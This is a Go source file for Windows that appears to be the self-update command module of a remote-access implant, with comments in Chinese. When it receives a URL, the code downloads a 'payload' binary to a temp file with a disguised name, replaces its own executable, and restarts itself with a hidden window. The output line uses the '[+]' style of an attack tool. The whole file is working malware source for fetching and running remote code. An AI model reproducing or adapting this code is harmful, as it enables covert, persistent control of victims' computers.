//go:build windows

package commands

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// ===== A7: 客户端自我更新 =====
// update <url>：下载新版本二进制 -> 重命名当前 exe -> 替换 -> 重启进程。

// CmdSelfUpdate 自我更新入口（cmdBuf = 下载 URL）
func CmdSelfUpdate(cmdBuf []byte) ([]byte, error) {
	url := strings.TrimSpace(string(cmdBuf))
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		return nil, fmt.Errorf("用法: self_update <url>（http/https 下载地址）")
	}

	// 1. 下载新版本到 %TEMP%
	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("下载失败: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("下载失败: HTTP %d", resp.StatusCode)
	}
	tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("~%s_update_%d.exe", masquerade(""), time.Now().UnixNano()))
	fp, err := os.Create(tmpPath)
	if err != nil {
		return nil, err
	}
	n, err := io.Copy(fp, resp.Body)
	fp.Close()
	if err != nil {
		os.Remove(tmpPath)
		return nil, fmt.Errorf("写入失败: %v", err)
	}
	if n < 1024*1024 {
		// 小于 1MB 大概率不是有效载荷，谨慎处理
		os.Remove(tmpPath)
		return nil, fmt.Errorf("下载文件过小（%d 字节），已取消更新", n)
	}

	// 2. 替换当前 exe
	self, err := os.Executable()
	if err != nil {
		os.Remove(tmpPath)
		return nil, err
	}
	oldPath := self + ".old"
	// 重命名当前 exe（运行中可重命名）
	if err := os.Rename(self, oldPath); err != nil {
		os.Remove(tmpPath)
		return nil, fmt.Errorf("重命名当前程序失败: %v", err)
	}
	// 复制新版本到原路径
	if err := copyFile(tmpPath, self); err != nil {
		// 回滚
		os.Rename(oldPath, self)
		os.Remove(tmpPath)
		return nil, fmt.Errorf("替换失败（已回滚）: %v", err)
	}
	os.Remove(tmpPath)

	// 3. 重启新进程（隐藏窗口），2 秒后退出当前进程
	go func() {
		time.Sleep(2 * time.Second)
		cmd := execHidden(self)
		if cmd != nil {
			cmd.Start()
		}
		os.Exit(0)
	}()

	return []byte("[+] 更新文件已就绪，2 秒后重启新版本: " + url), nil
}

// execHidden 隐藏窗口启动可执行文件
func execHidden(path string) *exec.Cmd {
	cmd := exec.Command(path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000} // CREATE_NO_WINDOW
	return cmd
}

// copyFile 复制文件
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}
